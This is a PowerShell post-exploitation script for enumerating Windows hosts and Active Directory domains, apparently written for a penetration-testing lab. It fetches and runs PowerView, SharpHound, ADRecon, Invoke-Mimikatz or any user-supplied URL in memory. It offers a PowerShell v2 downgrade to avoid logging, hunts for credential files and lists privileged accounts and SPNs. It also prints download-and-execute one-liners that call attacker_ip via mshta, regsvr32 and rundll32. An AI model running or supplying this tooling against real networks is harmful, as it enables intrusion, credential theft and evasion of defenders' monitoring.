function Invoke-ADEnumeration {
    param(
        [switch]$DownloadTools,
        [string]$ScriptURL
    )
    
    $banner = @"
===================================================================
    Active Directory LOTL Enumeration Script
    Living Off The Land - Native Windows Commands Only
===================================================================
"@
    
    Write-Host $banner -ForegroundColor Cyan
    
    # Interactive Menu for Tool Download
    if (-not $DownloadTools) {
        Write-Host ""
        Write-Host "[?] Do you want to download and execute additional enumeration tools?" -ForegroundColor Yellow
        Write-Host "    (PowerView, SharpHound, ADRecon, etc.)" -ForegroundColor Gray
        $response = Read-Host "    [Y/N]"
        
        if ($response -eq 'Y' -or $response -eq 'y') {
            Write-Host ""
            Write-Host "[*] Available Tools:" -ForegroundColor Cyan
            Write-Host "    1. PowerView (PowerSploit)" -ForegroundColor White
            Write-Host "    2. SharpHound (BloodHound Collector)" -ForegroundColor White
            Write-Host "    3. ADRecon" -ForegroundColor White
            Write-Host "    4. Invoke-Mimikatz" -ForegroundColor White
            Write-Host "    5. Custom Script URL" -ForegroundColor White
            Write-Host "    0. Skip and continue with LOTL only" -ForegroundColor White
            
            $toolChoice = Read-Host "[?] Select tool number"
            
            switch ($toolChoice) {
                "1" {
                    Write-Host ""
                    Write-Host "[*] Downloading PowerView..." -ForegroundColor Green
                    $url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
                    try {
                        powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('$url')"
                        Write-Host "[+] PowerView loaded successfully!" -ForegroundColor Green
                        Write-Host "[*] Example: Get-DomainUser, Get-DomainComputer, Get-DomainGroup" -ForegroundColor Gray
                    } catch {
                        Write-Host "[!] Failed to download PowerView: $_" -ForegroundColor Red
                    }
                }
                "2" {
                    Write-Host ""
                    Write-Host "[*] Downloading SharpHound..." -ForegroundColor Green
                    $url = "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1"
                    try {
                        powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('$url')"
                        Write-Host "[+] SharpHound loaded successfully!" -ForegroundColor Green
                        Write-Host "[*] Example: Invoke-BloodHound -CollectionMethod All" -ForegroundColor Gray
                    } catch {
                        Write-Host "[!] Failed to download SharpHound: $_" -ForegroundColor Red
                    }
                }
                "3" {
                    Write-Host ""
                    Write-Host "[*] Downloading ADRecon..." -ForegroundColor Green
                    $url = "https://raw.githubusercontent.com/adrecon/ADRecon/master/ADRecon.ps1"
                    try {
                        powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('$url')"
                        Write-Host "[+] ADRecon loaded successfully!" -ForegroundColor Green
                        Write-Host "[*] Example: Invoke-ADRecon" -ForegroundColor Gray
                    } catch {
                        Write-Host "[!] Failed to download ADRecon: $_" -ForegroundColor Red
                    }
                }
                "4" {
                    Write-Host ""
                    Write-Host "[*] Downloading Invoke-Mimikatz..." -ForegroundColor Green
                    Write-Host "[!] WARNING: This is detected by AV/EDR!" -ForegroundColor Red
                    $confirm = Read-Host "    Continue? [Y/N]"
                    if ($confirm -eq 'Y' -or $confirm -eq 'y') {
                        $url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"
                        try {
                            powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('$url')"
                            Write-Host "[+] Invoke-Mimikatz loaded successfully!" -ForegroundColor Green
                        } catch {
                            Write-Host "[!] Failed to download Invoke-Mimikatz: $_" -ForegroundColor Red
                        }
                    }
                }
                "5" {
                    $customURL = Read-Host "[?] Enter custom script URL"
                    Write-Host "[*] Downloading from: $customURL" -ForegroundColor Green
                    try {
                        powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('$customURL')"
                        Write-Host "[+] Script loaded successfully!" -ForegroundColor Green
                    } catch {
                        Write-Host "[!] Failed to download script: $_" -ForegroundColor Red
                    }
                }
                "0" {
                    Write-Host ""
                    Write-Host "[*] Continuing with LOTL enumeration only..." -ForegroundColor Cyan
                }
                default {
                    Write-Host ""
                    Write-Host "[!] Invalid selection. Continuing with LOTL only..." -ForegroundColor Yellow
                }
            }
        }
    }
    
    # PowerShell Version Check and Downgrade Option
    Write-Host ""
    Write-Host "[?] Current PowerShell Version: $($PSVersionTable.PSVersion.Major).$($PSVersionTable.PSVersion.Minor)" -ForegroundColor Cyan
    if ($PSVersionTable.PSVersion.Major -gt 2) {
        Write-Host "[!] Logs are being generated in this version." -ForegroundColor Yellow
        $downgrade = Read-Host "[?] Downgrade to PowerShell v2 to avoid logging? [Y/N]"
        if ($downgrade -eq 'Y' -or $downgrade -eq 'y') {
            Write-Host "[*] Starting PowerShell v2..." -ForegroundColor Green
            Write-Host "[!] Note: Some commands may not work in v2. Restart script in new window." -ForegroundColor Yellow
            powershell.exe -version 2
            return
        }
    }
    
    # Section 1: Basic Host Information
    Write-Host ""
    Write-Host ""
    Write-Host "[*] BASIC HOST ENUMERATION" -ForegroundColor Yellow
    Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
    
    try {
        Write-Host ""
        Write-Host "[+] Hostname:" -ForegroundColor Green
        hostname
        
        Write-Host ""
        Write-Host "[+] Current User and Domain:" -ForegroundColor Green
        whoami
        
        Write-Host ""
        Write-Host "[+] OS Version:" -ForegroundColor Green
        [System.Environment]::OSVersion.Version | Format-List
        
        Write-Host ""
        Write-Host "[+] System Information:" -ForegroundColor Green
        systeminfo
        
        Write-Host ""
        Write-Host "[+] Hotfixes/Patches:" -ForegroundColor Green
        wmic qfe get Caption,Description,HotFixID,InstalledOn
        
        Write-Host ""
        Write-Host "[+] Environment Variables:" -ForegroundColor Green
        Get-ChildItem Env: | Format-Table Key,Value -AutoSize
        
        Write-Host ""
        Write-Host "[+] Current Domain:" -ForegroundColor Green
        $env:USERDOMAIN
        
        Write-Host ""
        Write-Host "[+] Logon Server (Domain Controller):" -ForegroundColor Green
        $env:LOGONSERVER
        
        Write-Host ""
        Write-Host "[+] Computer System Info:" -ForegroundColor Green
        wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:list
    } catch {
        Write-Host "[!] Error in Basic Host Enumeration: $_" -ForegroundColor Red
    }
    
    # Section 2: PowerShell Configuration and History
    Write-Host ""
    Write-Host ""
    Write-Host "[*] POWERSHELL CONFIGURATION" -ForegroundColor Yellow
    Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
    
    try {
        Write-Host ""
        Write-Host "[+] PowerShell Version:" -ForegroundColor Green
        Get-Host | Select-Object Version
        
        Write-Host ""
        Write-Host "[+] Loaded Modules:" -ForegroundColor Green
        Get-Module | Format-Table Name,Version,ModuleType
        
        Write-Host ""
        Write-Host "[+] Execution Policy:" -ForegroundColor Green
        Get-ExecutionPolicy -List | Format-Table
        
        Write-Host ""
        Write-Host "[+] PowerShell History (Current User):" -ForegroundColor Green
        if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt") {
            Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" | Select-Object -Last 50
        } else {
            Write-Host "  No history file found" -ForegroundColor Gray
        }
    } catch {
        Write-Host "[!] Error in PowerShell Configuration: $_" -ForegroundColor Red
    }
    
    # Section 3: Network Configuration
    Write-Host ""
    Write-Host ""
    Write-Host "[*] NETWORK CONFIGURATION" -ForegroundColor Yellow
    Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
    
    try {
        Write-Host ""
        Write-Host "[+] Network Adapters:" -ForegroundColor Green
        ipconfig /all
        
        Write-Host ""
        Write-Host "[+] ARP Cache:" -ForegroundColor Green
        arp -a
        
        Write-Host ""
        Write-Host "[+] Routing Table:" -ForegroundColor Green
        route print
        
        Write-Host ""
        Write-Host "[+] Active Network Connections:" -ForegroundColor Green
        netstat -ano
        
        Write-Host ""
        Write-Host "[+] DNS Cache:" -ForegroundColor Green
        ipconfig /displaydns
        
        Write-Host ""
        Write-Host "[+] Network Shares:" -ForegroundColor Green
        net share
        
        Write-Host ""
        Write-Host "[+] Current Network Views:" -ForegroundColor Green
        net view
    } catch {
        Write-Host "[!] Error in Network Configuration: $_" -ForegroundColor Red
    }
    
    # Section 4: Firewall and Security Status
    Write-Host ""
    Write-Host ""
    Write-Host "[*] FIREWALL AND SECURITY STATUS" -ForegroundColor Yellow
    Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
    
    try {
        Write-Host ""
        Write-Host "[+] Firewall Profile Status:" -ForegroundColor Green
        netsh advfirewall show allprofiles
        
        Write-Host ""
        Write-Host "[+] Windows Defender Status:" -ForegroundColor Green
        sc query windefend
        
        Write-Host ""
        Write-Host "[+] Defender Configuration:" -ForegroundColor Green
        Get-MpComputerStatus
        
        Write-Host ""
        Write-Host "[+] Defender Preferences:" -ForegroundColor Green
        Get-MpPreference | Format-List
    } catch {
        Write-Host "[!] Error in Security Status: $_" -ForegroundColor Red
    }
    
    # Section 5: Active Sessions
    Write-Host ""
    Write-Host ""
    Write-Host "[*] ACTIVE USER SESSIONS" -ForegroundColor Yellow
    Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
    
    try {
        Write-Host ""
        Write-Host "[+] Current Sessions:" -ForegroundColor Green
        qwinsta
        
        Write-Host ""
        Write-Host "[+] Logged On Users:" -ForegroundColor Green
        query user
    } catch {
        Write-Host "[!] Error in Session Enumeration: $_" -ForegroundColor Red
    }
    
    # Section 6: Local User and Group Enumeration
    Write-Host ""
    Write-Host ""
    Write-Host "[*] LOCAL USERS AND GROUPS" -ForegroundColor Yellow
    Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
    
    try {
        Write-Host ""
        Write-Host "[+] Local Users:" -ForegroundColor Green
        Get-LocalUser | Format-Table Name,Enabled,LastLogon
        net user
        
        Write-Host ""
        Write-Host "[+] Local Groups:" -ForegroundColor Green
        Get-LocalGroup | Format-Table Name,Description
        net localgroup
        
        Write-Host ""
        Write-Host "[+] Local Administrators:" -ForegroundColor Green
        net localgroup administrators
        Get-LocalGroupMember -Group "Administrators" | Format-Table
        
        Write-Host ""
        Write-Host "[+] All Local Group Memberships:" -ForegroundColor Green
        $groups = Get-LocalGroup
        foreach ($group in $groups) {
            Write-Host ""
            Write-Host "  [$($group.Name)]" -ForegroundColor Cyan
            Get-LocalGroupMember -Group $group.Name -ErrorAction SilentlyContinue | Format-Table
        }
    } catch {
        Write-Host "[!] Error in Local User/Group Enumeration: $_" -ForegroundColor Red
    }
    
    # Section 7: Domain Enumeration (Net Commands)
    Write-Host ""
    Write-Host ""
    Write-Host "[*] DOMAIN ENUMERATION (NET COMMANDS)" -ForegroundColor Yellow
    Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
    
    try {
        Write-Host ""
        Write-Host "[+] Domain Password Policy:" -ForegroundColor Green
        net accounts /domain
        
        Write-Host ""
        Write-Host "[+] Domain Groups:" -ForegroundColor Green
        net group /domain
        
        Write-Host ""
        Write-Host "[+] Domain Users:" -ForegroundColor Green
        net user /domain
        
        Write-Host ""
        Write-Host "[+] Domain Admins:" -ForegroundColor Green
        net group "Domain Admins" /domain
        
        Write-Host ""
        Write-Host "[+] Enterprise Admins:" -ForegroundColor Green
        net group "Enterprise Admins" /domain
        
        Write-Host ""
        Write-Host "[+] Domain Controllers:" -ForegroundColor Green
        net group "Domain Controllers" /domain
        
        Write-Host ""
        Write-Host "[+] Domain Computers:" -ForegroundColor Green
        net group "Domain Computers" /domain
        
        Write-Host ""
        Write-Host "[+] Domain Views:" -ForegroundColor Green
        net view /domain
    } catch {
        Write-Host "[!] Error in Domain Enumeration: $_" -ForegroundColor Red
    }
    
    # Section 8: WMI Enumeration
    Write-Host ""
    Write-Host ""
    Write-Host "[*] WMI ENUMERATION" -ForegroundColor Yellow
    Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
    
    try {
        Write-Host ""
        Write-Host "[+] Domain and Trust Information:" -ForegroundColor Green
        wmic ntdomain list /format:list
        wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
        
        Write-Host ""
        Write-Host "[+] User Accounts:" -ForegroundColor Green
        wmic useraccount list /format:list
        
        Write-Host ""
        Write-Host "[+] Groups:" -ForegroundColor Green
        wmic group list /format:list
        
        Write-Host ""
        Write-Host "[+] System Accounts:" -ForegroundColor Green
        wmic sysaccount list /format:list
        
        Write-Host ""
        Write-Host "[+] Running Processes:" -ForegroundColor Green
        wmic process list brief
        
        Write-Host ""
        Write-Host "[+] Startup Programs:" -ForegroundColor Green
        wmic startup list full
        
        Write-Host ""
        Write-Host "[+] Installed Software:" -ForegroundColor Green
        wmic product get name,version
        
        Write-Host ""
        Write-Host "[+] Services:" -ForegroundColor Green
        wmic service list brief
    } catch {
        Write-Host "[!] Error in WMI Enumeration: $_" -ForegroundColor Red
    }
    
    # Section 9: DSQuery Enumeration
    Write-Host ""
    Write-Host ""
    Write-Host "[*] DSQUERY ENUMERATION" -ForegroundColor Yellow
    Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
    
    try {
        Write-Host ""
        Write-Host "[+] Domain Users:" -ForegroundColor Green
        dsquery user
        
        Write-Host ""
        Write-Host "[+] Domain Computers:" -ForegroundColor Green
        dsquery computer
        
        Write-Host ""
        Write-Host "[+] Domain Controllers:" -ForegroundColor Green
        dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 10 -attr sAMAccountName
        
        Write-Host ""
        Write-Host "[+] Users with Password Not Required:" -ForegroundColor Green
        dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
        
        Write-Host ""
        Write-Host "[+] Disabled Accounts:" -ForegroundColor Green
        dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr distinguishedName description
        
        Write-Host ""
        Write-Host "[+] Service Principal Names (SPNs):" -ForegroundColor Green
        dsquery * -filter "(servicePrincipalName=*)" -attr sAMAccountName servicePrincipalName
        
        Write-Host ""
        Write-Host "[+] Organizational Units:" -ForegroundColor Green
        dsquery ou
        
        Write-Host ""
        Write-Host "[+] All Objects in Users Container:" -ForegroundColor Green
        dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL" -limit 20
    } catch {
        Write-Host "[!] Error in DSQuery Enumeration: $_" -ForegroundColor Red
    }
    
    # Section 10: Active Directory PowerShell Module
    Write-Host ""
    Write-Host ""
    Write-Host "[*] ACTIVE DIRECTORY POWERSHELL MODULE" -ForegroundColor Yellow
    Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
    
    try {
        if (Get-Module -ListAvailable -Name ActiveDirectory) {
            Import-Module ActiveDirectory -ErrorAction SilentlyContinue
            
            Write-Host ""
            Write-Host "[+] Domain Information:" -ForegroundColor Green
            Get-ADDomain | Format-List
            
            Write-Host ""
            Write-Host "[+] Forest Information:" -ForegroundColor Green
            Get-ADForest | Format-List
            
            Write-Host ""
            Write-Host "[+] All Domain Controllers:" -ForegroundColor Green
            Get-ADDomainController -Filter * | Format-Table Name,IPv4Address,OperatingSystem
            
            Write-Host ""
            Write-Host "[+] All Domain Users:" -ForegroundColor Green
            Get-ADUser -Filter * | Select-Object Name,SamAccountName,Enabled,LastLogonDate | Format-Table
            
            Write-Host ""
            Write-Host "[+] Domain Admins:" -ForegroundColor Green
            Get-ADGroupMember -Identity "Domain Admins" -Recursive | Format-Table Name,SamAccountName
            
            Write-Host ""
            Write-Host "[+] Enterprise Admins:" -ForegroundColor Green
            Get-ADGroupMember -Identity "Enterprise Admins" -Recursive | Format-Table Name,SamAccountName
            
            Write-Host ""
            Write-Host "[+] All Domain Groups:" -ForegroundColor Green
            Get-ADGroup -Filter * | Select-Object Name,GroupScope,GroupCategory | Format-Table
            
            Write-Host ""
            Write-Host "[+] Domain Computers:" -ForegroundColor Green
            Get-ADComputer -Filter * | Select-Object Name,OperatingSystem,IPv4Address | Format-Table
            
            Write-Host ""
            Write-Host "[+] Domain Trusts:" -ForegroundColor Green
            Get-ADTrust -Filter * | Format-Table
            
            Write-Host ""
            Write-Host "[+] Fine-Grained Password Policies:" -ForegroundColor Green
            Get-ADFineGrainedPasswordPolicy -Filter * | Format-List
            
            Write-Host ""
            Write-Host "[+] Group Policy Objects:" -ForegroundColor Green
            Get-GPO -All | Select-Object DisplayName,GpoStatus,CreationTime,ModificationTime | Format-Table
        } else {
            Write-Host "[!] Active Directory PowerShell module not available" -ForegroundColor Red
        }
    } catch {
        Write-Host "[!] Error in AD PowerShell Enumeration: $_" -ForegroundColor Red
    }
    
    # Section 11: Additional Security Checks
    Write-Host ""
    Write-Host ""
    Write-Host "[*] ADDITIONAL SECURITY CHECKS" -ForegroundColor Yellow
    Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
    
    try {
        Write-Host ""
        Write-Host "[+] Scheduled Tasks:" -ForegroundColor Green
        schtasks /query /fo LIST /v
        
        Write-Host ""
        Write-Host "[+] Registry Auto-Run Keys:" -ForegroundColor Green
        reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
        reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
        reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
        
        Write-Host ""
        Write-Host "[+] Installed Drivers:" -ForegroundColor Green
        driverquery
        
        Write-Host ""
        Write-Host "[+] AppLocker Rules:" -ForegroundColor Green
        Get-AppLockerPolicy -Effective | Format-List
    } catch {
        Write-Host "[!] Error in Security Checks: $_" -ForegroundColor Red
    }
    
    # Section 12: Credential/Sensitive File Search
    Write-Host ""
    Write-Host ""
    Write-Host "[*] SENSITIVE FILE SEARCH" -ForegroundColor Yellow
    Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
    
    try {
        Write-Host ""
        Write-Host "[+] Searching for interesting files..." -ForegroundColor Green
        $searchPaths = @("C:\Users", "C:\Temp", "C:\Windows\Temp")
        $searchPatterns = @("*pass*", "*cred*", "*vnc*", "*.config", "*unattend*", "*sysprep*", "*.xml", "*.txt", "*.ini")
        
        foreach ($path in $searchPaths) {
            if (Test-Path $path) {
                foreach ($pattern in $searchPatterns) {
                    Get-ChildItem -Path $path -Filter $pattern -Recurse -ErrorAction SilentlyContinue -Depth 2 | 
                        Select-Object FullName, Length, LastWriteTime | Format-Table
                }
            }
        }
    } catch {
        Write-Host "[!] Error in File Search: $_" -ForegroundColor Red
    }
    
    # Section 13: File Download Capabilities
    Write-Host ""
    Write-Host ""
    Write-Host "[*] ADDITIONAL DOWNLOAD OPTIONS" -ForegroundColor Yellow
    Write-Host "-------------------------------------------------------------" -ForegroundColor Gray
    
    Write-Host ""
    Write-Host "[?] Do you want to download additional files/tools?" -ForegroundColor Cyan
    $downloadMore = Read-Host "    [Y/N]"
    
    if ($downloadMore -eq 'Y' -or $downloadMore -eq 'y') {
        Write-Host ""
        Write-Host "[*] Download Methods Available:" -ForegroundColor Green
        Write-Host "    1. PowerShell WebClient (IEX)" -ForegroundColor White
        Write-Host "    2. PowerShell DownloadFile" -ForegroundColor White
        Write-Host "    3. CertUtil Download" -ForegroundColor White
        Write-Host "    4. BitsTransfer" -ForegroundColor White
        Write-Host "    5. Show All Download One-Liners" -ForegroundColor White
        
        $methodChoice = Read-Host "[?] Select method"
        $fileURL = Read-Host "[?] Enter URL to download from"
        
        switch ($methodChoice) {
            "1" {
                Write-Host ""
                Write-Host "[*] Using PowerShell WebClient (Execute in Memory)..." -ForegroundColor Green
                Write-Host "[CMD] powershell -nop -c ""iex(New-Object Net.WebClient).DownloadString('$fileURL')""" -ForegroundColor Gray
                try {
                    powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('$fileURL')"
                    Write-Host "[+] Executed successfully!" -ForegroundColor Green
                } catch {
                    Write-Host "[!] Error: $_" -ForegroundColor Red
                }
            }
            "2" {
                $savePath = Read-Host "[?] Enter save path (e.g., C:\temp\file.exe)"
                Write-Host ""
                Write-Host "[*] Using PowerShell DownloadFile..." -ForegroundColor Green
                Write-Host "[CMD] (New-Object Net.WebClient).DownloadFile('$fileURL','$savePath')" -ForegroundColor Gray
                try {
                    (New-Object Net.WebClient).DownloadFile($fileURL, $savePath)
                    Write-Host "[+] Downloaded to: $savePath" -ForegroundColor Green
                } catch {
                    Write-Host "[!] Error: $_" -ForegroundColor Red
                }
            }
            "3" {
                $savePath = Read-Host "[?] Enter save path (e.g., C:\temp\file.exe)"
                Write-Host ""
                Write-Host "[*] Using CertUtil..." -ForegroundColor Green
                Write-Host "[CMD] certutil -urlcache -split -f '$fileURL' '$savePath'" -ForegroundColor Gray
                try {
                    certutil -urlcache -split -f $fileURL $savePath
                    Write-Host "[+] Downloaded to: $savePath" -ForegroundColor Green
                } catch {
                    Write-Host "[!] Error: $_" -ForegroundColor Red
                }
            }
            "4" {
                $savePath = Read-Host "[?] Enter save path (e.g., C:\temp\file.exe)"
                Write-Host ""
                Write-Host "[*] Using BitsTransfer..." -ForegroundColor Green
                Write-Host "[CMD] Import-Module BitsTransfer; Start-BitsTransfer -Source '$fileURL' -Destination '$savePath'" -ForegroundColor Gray
                try {
                    Import-Module BitsTransfer
                    Start-BitsTransfer -Source $fileURL -Destination $savePath
                    Write-Host "[+] Downloaded to: $savePath" -ForegroundColor Green
                } catch {
                    Write-Host "[!] Error: $_" -ForegroundColor Red
                }
            }
            "5" {
                Write-Host ""
                Write-Host "[*] ALL DOWNLOAD ONE-LINERS:" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "1. PowerShell WebClient (Execute in Memory):" -ForegroundColor Yellow
                Write-Host "   powershell -nop -c ""iex(New-Object Net.WebClient).DownloadString('URL')""" -ForegroundColor White
                Write-Host "   IEX (New-Object Net.WebClient).DownloadString('URL')" -ForegroundColor White
                
                Write-Host ""
                Write-Host "2. PowerShell DownloadFile:" -ForegroundColor Yellow
                Write-Host "   (New-Object Net.WebClient).DownloadFile('URL','C:\path\file.exe')" -ForegroundColor White
                Write-Host "   Invoke-WebRequest -Uri 'URL' -OutFile 'C:\path\file.exe'" -ForegroundColor White
                Write-Host "   wget 'URL' -O 'C:\path\file.exe'" -ForegroundColor White
                Write-Host "   curl 'URL' -o 'C:\path\file.exe'" -ForegroundColor White
                
                Write-Host ""
                Write-Host "3. CertUtil:" -ForegroundColor Yellow
                Write-Host "   certutil -urlcache -split -f 'URL' C:\path\file.exe" -ForegroundColor White
                Write-Host "   certutil -verifyctl -split -f 'URL' C:\path\file.exe" -ForegroundColor White
                
                Write-Host ""
                Write-Host "4. BitsTransfer:" -ForegroundColor Yellow
                Write-Host "   Import-Module BitsTransfer; Start-BitsTransfer -Source 'URL' -Destination C:\path\file.exe" -ForegroundColor White
                Write-Host "   bitsadmin /transfer job /download /priority high 'URL' C:\path\file.exe" -ForegroundColor White
                
                Write-Host ""
                Write-Host "5. SMB Copy:" -ForegroundColor Yellow
                Write-Host "   copy \\attacker_ip\share\file.exe C:\path\file.exe" -ForegroundColor White
                Write-Host "   xcopy \\attacker_ip\share\file.exe C:\path\ /Y" -ForegroundColor White
                Write-Host "   net use \\attacker_ip\share; copy \\attacker_ip\share\file.exe C:\path\" -ForegroundColor White
                
                Write-Host ""
                Write-Host "6. MSHTA (Execute):" -ForegroundColor Yellow
                Write-Host "   mshta http://attacker_ip/payload.hta" -ForegroundColor White
                
                Write-Host ""
                Write-Host "7. Rundll32:" -ForegroundColor Yellow
                Write-Host "   rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('URL')"")" -ForegroundColor White
                
                Write-Host ""
                Write-Host "8. Regsvr32 (Squiblydoo):" -ForegroundColor Yellow
                Write-Host "   regsvr32 /s /n /u /i:http://attacker_ip/payload.sct scrobj.dll" -ForegroundColor White
                
                Write-Host ""
                Write-Host "9. Base64 Encoded Download:" -ForegroundColor Yellow
                Write-Host "   powershell -enc <BASE64_ENCODED_COMMAND>" -ForegroundColor White
                
                Write-Host ""
                Write-Host "10. LOLBins Alternative Downloads:" -ForegroundColor Yellow
                Write-Host "   bitsadmin /transfer myDownloadJob /download /priority normal URL C:\path\file.exe" -ForegroundColor White
                Write-Host "   desktopimgdownldr.exe /lockscreenurl:URL /eventName:desktopimgdownldr" -ForegroundColor White
                Write-Host "   esentutl.exe /y \\attacker\share\file.exe /d C:\path\file.exe /o" -ForegroundColor White
            }
        }
    }
    
    Write-Host ""
    Write-Host ""
    Write-Host "===================================================================" -ForegroundColor Cyan
    Write-Host "    Enumeration Complete!" -ForegroundColor Green
    Write-Host "===================================================================" -ForegroundColor Cyan
}

# Helper Function: Quick Download
function Invoke-QuickDownload {
    param(
        [Parameter(Mandatory=$true)]
        [string]$URL,
        [string]$SavePath,
        [switch]$ExecuteInMemory
    )
    
    if ($ExecuteInMemory) {
        Write-Host "[*] Downloading and executing in memory..." -ForegroundColor Green
        try {
            powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('$URL')"
            Write-Host "[+] Execution complete!" -ForegroundColor Green
        } catch {
            Write-Host "[!] Error: $_" -ForegroundColor Red
        }
    } else {
        if (-not $SavePath) {
            $SavePath = "$env:TEMP\$(Split-Path $URL -Leaf)"
        }
        Write-Host "[*] Downloading to: $SavePath" -ForegroundColor Green
        try {
            (New-Object Net.WebClient).DownloadFile($URL, $SavePath)
            Write-Host "[+] Download complete!" -ForegroundColor Green
            return $SavePath
        } catch {
            Write-Host "[!] Error: $_" -ForegroundColor Red
        }
    }
}

# Helper Function: All LOTL Commands Quick Reference
function Get-LOTLCommands {
    Write-Host ""
    Write-Host "===================================================================" -ForegroundColor Cyan
    Write-Host "    LIVING OFF THE LAND - COMMAND REFERENCE" -ForegroundColor Yellow
    Write-Host "===================================================================" -ForegroundColor Cyan
    
    Write-Host ""
    Write-Host "[*] BASIC ENUMERATION" -ForegroundColor Yellow
    Write-Host "hostname                                          - Computer name" -ForegroundColor White
    Write-Host "whoami                                           - Current user" -ForegroundColor White
    Write-Host "whoami /priv                                     - User privileges" -ForegroundColor White
    Write-Host "whoami /groups                                   - User groups" -ForegroundColor White
    Write-Host "[System.Environment]::OSVersion.Version          - OS version" -ForegroundColor White
    Write-Host "systeminfo                                       - System info" -ForegroundColor White
    Write-Host "wmic qfe get Caption,Description,HotFixID,InstalledOn  - Patches" -ForegroundColor White
    Write-Host "`$env:USERDOMAIN                                  - Domain name" -ForegroundColor White
    Write-Host "`$env:LOGONSERVER                                - Logon server" -ForegroundColor White
    
    Write-Host ""
    Write-Host "[*] NETWORK ENUMERATION" -ForegroundColor Yellow
    Write-Host "ipconfig /all                                    - Network config" -ForegroundColor White
    Write-Host "arp -a                                          - ARP cache" -ForegroundColor White
    Write-Host "route print                                     - Routing table" -ForegroundColor White
    Write-Host "netstat -ano                                    - Active connections" -ForegroundColor White
    Write-Host "netsh advfirewall show allprofiles              - Firewall status" -ForegroundColor White
    Write-Host "net share                                       - Network shares" -ForegroundColor White
    Write-Host "net view                                        - Network computers" -ForegroundColor White
    Write-Host "net view /domain                                - Domain view" -ForegroundColor White
    
    Write-Host ""
    Write-Host "[*] USER AND GROUP ENUMERATION" -ForegroundColor Yellow
    Write-Host "net user                                        - Local users" -ForegroundColor White
    Write-Host "net user /domain                                - Domain users" -ForegroundColor White
    Write-Host "net user USERNAME /domain                       - Specific user info" -ForegroundColor White
    Write-Host "net localgroup                                  - Local groups" -ForegroundColor White
    Write-Host "net localgroup administrators                   - Local admins" -ForegroundColor White
    Write-Host "net group /domain                               - Domain groups" -ForegroundColor White
    Write-Host "net group ""Domain Admins"" /domain              - Domain admins" -ForegroundColor White
    Write-Host "net group ""Enterprise Admins"" /domain          - Enterprise admins" -ForegroundColor White
    Write-Host "net group ""Domain Controllers"" /domain         - Domain controllers" -ForegroundColor White
    Write-Host "net accounts /domain                            - Password policy" -ForegroundColor White
    
    Write-Host ""
    Write-Host "[*] WMI ENUMERATION" -ForegroundColor Yellow
    Write-Host "wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles" -ForegroundColor White
    Write-Host "wmic ntdomain list /format:list                 - Domain info" -ForegroundColor White
    Write-Host "wmic useraccount list /format:list              - User accounts" -ForegroundColor White
    Write-Host "wmic group list /format:list                    - Groups" -ForegroundColor White
    Write-Host "wmic sysaccount list /format:list               - System accounts" -ForegroundColor White
    Write-Host "wmic process list brief                         - Running processes" -ForegroundColor White
    Write-Host "wmic startup list full                          - Startup programs" -ForegroundColor White
    Write-Host "wmic service list brief                         - Services" -ForegroundColor White
    Write-Host "wmic product get name,version                   - Installed software" -ForegroundColor White
    
    Write-Host ""
    Write-Host "[*] DSQUERY ENUMERATION" -ForegroundColor Yellow
    Write-Host "dsquery user                                    - All users" -ForegroundColor White
    Write-Host "dsquery computer                                - All computers" -ForegroundColor White
    Write-Host "dsquery group                                   - All groups" -ForegroundColor White
    Write-Host "dsquery ou                                      - All OUs" -ForegroundColor White
    Write-Host "dsquery * -filter ""(userAccountControl:1.2.840.113556.1.4.803:=8192)"" -attr sAMAccountName" -ForegroundColor White
    Write-Host "                                                - Domain controllers" -ForegroundColor Gray
    Write-Host "dsquery * -filter ""(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))""" -ForegroundColor White
    Write-Host "                                                - Users with PASSWD_NOTREQD" -ForegroundColor Gray
    
    Write-Host ""
    Write-Host "[*] POWERSHELL COMMANDS" -ForegroundColor Yellow
    Write-Host "Get-LocalUser                                   - Local users" -ForegroundColor White
    Write-Host "Get-LocalGroup                                  - Local groups" -ForegroundColor White
    Write-Host "Get-LocalGroupMember -Group ""Administrators""   - Group members" -ForegroundColor White
